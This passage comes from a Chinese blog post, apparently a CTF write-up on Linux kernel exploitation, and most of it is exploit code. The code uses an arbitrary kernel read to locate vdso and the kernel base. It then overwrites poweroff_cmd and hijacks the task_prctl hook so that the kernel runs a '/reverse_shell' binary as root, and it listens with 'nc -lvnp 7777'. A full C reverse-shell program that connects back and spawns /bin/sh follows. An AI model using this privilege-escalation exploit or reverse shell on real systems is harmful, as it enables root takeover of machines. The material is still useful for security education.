shrink_channel(id,<span class="number">0x101</span>);  </span><br><span class="line">   <span class="comment">//获取gettimeofday字符串在vdso.so里的偏移  </span></span><br><span class="line">   <span class="type">int</span> gettimeofday_str_offset = get_gettimeofday_str_offset();  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>,gettimeofday_str_offset);  </span><br><span class="line">   <span class="type">size_t</span> vdso_addr = <span class="number">-1</span>;  </span><br><span class="line">   <span class="keyword">for</span> (<span class="type">size_t</span> addr=<span class="number">0xffffffff80000000</span>;addr &lt; <span class="number">0xffffffffffffefff</span>;addr += <span class="number">0x1000</span>) &#123;  </span><br><span class="line">      <span class="comment">//读取一页数据  </span></span><br><span class="line">      arbitrary_read(id,buf,addr,<span class="number">0x1000</span>);  </span><br><span class="line">      <span class="comment">//如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址  </span></span><br><span class="line">      <span class="comment">//之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页  </span></span><br><span class="line">      <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf+gettimeofday_str_offset,<span class="string">&quot;gettimeofday&quot;</span>)) &#123;  </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;[+]find vdso.so!!\n&quot;</span>);  </span><br><span class="line">         vdso_addr = addr;  </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;[+]vdso in kernel addr=0x%lx\n&quot;</span>,vdso_addr);  </span><br><span class="line">         <span class="keyword">break</span>;  </span><br><span class="line">      &#125;  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">if</span> (vdso_addr == <span class="number">-1</span>) &#123;  </span><br><span class="line">      errExit(<span class="string">&quot;[-]can&#x27;t find vdso.so!!&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="comment">//计算出kernel基地址  </span></span><br><span class="line">   <span class="type">size_t</span> kernel_base = vdso_addr &amp; <span class="number">0xffffffffff000000</span>;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+]kernel_base=0x%lx\n&quot;</span>,kernel_base);  </span><br><span class="line">   <span class="type">size_t</span> poweroff_cmd_addr = kernel_base + POWEROFF_CMD;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+]poweroff_cmd_addr=0x%lx\n&quot;</span>,poweroff_cmd_addr);  </span><br><span class="line">   <span class="type">size_t</span> orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+]poweroff_cmd_addr=0x%lx\n&quot;</span>,orderly_poweroff_addr);  </span><br><span class="line">   <span class="type">size_t</span> task_prctl_addr = kernel_base + TASK_PRCTL;  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;[+]task_prctl_addr=0x%lx\n&quot;</span>,task_prctl_addr);  </span><br><span class="line">   <span class="comment">//反弹shell，执行的二进制文件，由call_usermodehelper来执行，自带root  </span></span><br><span class="line">   <span class="type">char</span> reverse_command[] = <span class="string">&quot;/reverse_shell&quot;</span>;  </span><br><span class="line">   <span class="comment">//修改poweroff_cmd_addr处的字符串为我们需要执行的二进制文件的路径  </span></span><br><span class="line">   arbitrary_write(id,reverse_command,poweroff_cmd_addr,<span class="built_in">strlen</span>(reverse_command));  </span><br><span class="line">   <span class="comment">//hijack prctl，使得task_prctl指向orderly_poweroff函数  </span></span><br><span class="line">   arbitrary_write(id,&amp;orderly_poweroff_addr,task_prctl_addr,<span class="number">8</span>);  </span><br><span class="line">   <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123; <span class="comment">//fork一个子进程，来触发shell的反弹  </span></span><br><span class="line">      prctl(<span class="number">0</span>,<span class="number">0</span>);  </span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);  </span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[+]open a shell\n&quot;</span>);  </span><br><span class="line">      system(<span class="string">&quot;nc -lvnp 7777&quot;</span>);  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而qwb2018-solid_core同样，也是这个解法，稍作一下修改即可。反弹shell的程序如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="type">char</span> server_ip[]=<span class="string">&quot;127.0.0.1&quot;</span>;  </span><br><span class="line"><span class="type">uint32_t</span> server_port=<span class="number">7777</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>   </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;  </span><br><span class="line">    attacker_addr.sin_family = AF_INET;  </span><br><span class="line">    attacker_addr.sin_port = htons(server_port);  </span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);  </span><br><span class="line">    <span class="keyword">while</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>);  </span><br><span class="line">    dup2(sock, <span class="number">0</span>);  </span><br><span class="line">    dup2(sock, <span class="number">1</span>);  </span><br><span class="line">    dup2(sock, <span class="number">2</span>);  </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/ha1vk/2020/03/06/linux_kernel_pwn_hijack_prctl/image12.JPG" class="">
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/ha1vk/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/" rel="tag"># 堆溢出</a>
+              <a href="/ha1vk/tags/Linux-Kernel/" rel="tag"># Linux Kernel</a>
+              <a href="/ha1vk/tags/Linux%E5%86%85%E6%A0%B8%E5%A0%86/" rel="tag"># Linux内核堆</a>
+              <a href="/ha1vk/tags/hijack-prctl/" rel="tag"># hijack prctl</a>
+              <a href="/ha1vk/tags/modprobe-path/" rel="tag"># modprobe_path</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/03/06/linux_kernel_pwn_vdso/" rel="prev" title="linux kernel pwn学习之劫持vdso">
+      <i class="fa fa-chevron-left"></i> linux kernel pwn学习之劫持vdso
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/ha1vk/2020/04/02/mips_arm_aarch64-pwn%E5%88%9D%E6%8E%A2/" rel="next" title="mips/arm pwn初探">
+      mips/arm pwn初探 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ha1vk</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/ha1vk/archives/">
+        
+          <span class="site-state-item-count">233</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/ha1vk/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/ha1vk/tags/">
+          
+        <span class="site-state-item-count">145</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ha1vk</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/ha1vk/lib/anime.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
+  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/ha1vk/js/utils.js"></script>
+
+<script src="/ha1vk/js/motion.js"></script>
+
+
+<script src="/ha1vk/js/schemes/muse.js"></script>
+
+
+<script src="/ha1vk/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
